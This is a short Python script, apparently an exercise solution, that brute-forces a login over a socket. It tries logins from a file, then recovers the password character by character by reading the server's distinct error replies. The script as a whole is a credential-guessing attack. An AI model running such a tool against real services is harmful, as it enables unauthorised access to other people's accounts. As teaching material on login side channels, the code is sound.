import json
import sys
import socket
import string


def establish_connection(client_socket):
    args = sys.argv
    ip_address, port = args[1], args[2]
    client_socket.connect((ip_address, int(port)))


def send_receive(client_socket, buff_size, data):
    client_socket.send(json.dumps(data).encode())
    response = json.loads(client_socket.recv(buff_size).decode())
    return response


def guessing_login(client_socket, data, buff_size):
    with open("logins.txt", "r") as file:
        for line in file:
            data["login"] = line.rstrip('\n')
            response = send_receive(client_socket, buff_size, data)
            if response == {"result": "Wrong password!"}:
                return data


def guessing_password(client_socket, data, buff_size):
    symbols = string.ascii_letters + string.digits
    while True:
        for symbol in symbols:
            data["password"] += symbol
            response = send_receive(client_socket, buff_size, data)
            if response == {"result": "Wrong password!"}:
                data["password"] = data["password"][:-1]
            elif response == {"result": "Connection success!"}:
                return data


def main():
    buff_size = 1024
    data = {"login": '', "password": ''}
    with socket.socket() as client_socket:
        establish_connection(client_socket)
        guessing_login(client_socket, data, buff_size)
        guessing_password(client_socket, data, buff_size)
        print(json.dumps(data))
        client_socket.close()


if __name__ == "__main__":
    main()
